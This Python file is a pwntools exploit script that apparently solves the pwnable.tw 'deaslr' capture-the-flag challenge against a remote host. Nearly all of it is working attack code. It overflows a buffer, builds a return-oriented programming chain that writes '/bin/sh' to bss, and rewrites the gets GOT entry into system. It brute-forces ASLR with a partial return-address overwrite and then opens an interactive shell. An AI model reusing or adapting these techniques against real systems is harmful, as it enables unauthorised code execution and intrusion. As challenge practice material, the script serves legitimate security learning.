#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

exe = ELF("deaslr_patched", checksec=False)
libc = ELF("libc_64.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
b *main+30
b *0x4005c8
continue
'''

def conn():
    if args.LOCAL:
        p = process(exe.path)
        sleep(0.1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10402
        return remote(host, port)

gets_to_system = libc.symbols['system'] - libc.symbols['gets']
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
pop_rdi_ret = 0x4005c3
binsh_addr = exe.bss()
offset_addr = exe.bss() + 8
nop_ret = 0x4005c8

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)

    p = conn()

    # On WSL Ubuntu 24.04 ld base always ends with 0x1000000
    if args.LOCAL:
        with open(f'/proc/{p.pid}/maps') as f:
            ld_lines = [line for line in f if 'ld-2.23.so' in line]
        print(ld_lines[0], end='')
        if int(ld_lines[0].split('-')[0], 16) % 0x1000000 == 0:
            if args.GDB:
                gdb.attach(p, gdbscript=gdbscript)
                sleep(1)
        else:
            p.close()
            continue

    pl = flat(
        A(0x18),

        # Write /bin/sh to bss
        pop_rdi_ret,
        binsh_addr,
        exe.plt['gets'],

        # Set rbx and r15
        pop_rbx_rbp_r12_r13_r14_r15_ret,
        exe.got['gets'] - 0x10,
        0, 0, 0, 0,
        offset_addr,

        pop_rdi_ret,
        binsh_addr,

        p64(nop_ret) * 6,
    )

    if args.LOCAL:
        # Ubuntu 24.04 WSL
        pl += p16(0xc7f0)
    else:
        # Ubuntu 16.04 (Remote)
        # ld ends with 0x1000
        pl += p8(0xb0)
    # null byte at then end

    sl(p, pl)
    
    sleep(0.25)

    sl(p, flat(b'/bin/sh\0', gets_to_system))
    
    if args.GDB:
        input()
        
    try:
        sleep(0.5)
        sl(p, b'id')
        if p.recvuntil(b'id', timeout=0.5):
            print("Spawn shell:")
            rr(p, 0.5)
            ia(p)
        else:
            raise exception
    except:
        print("Failed attempt")
        p.close()
        continue

    p.close()
    break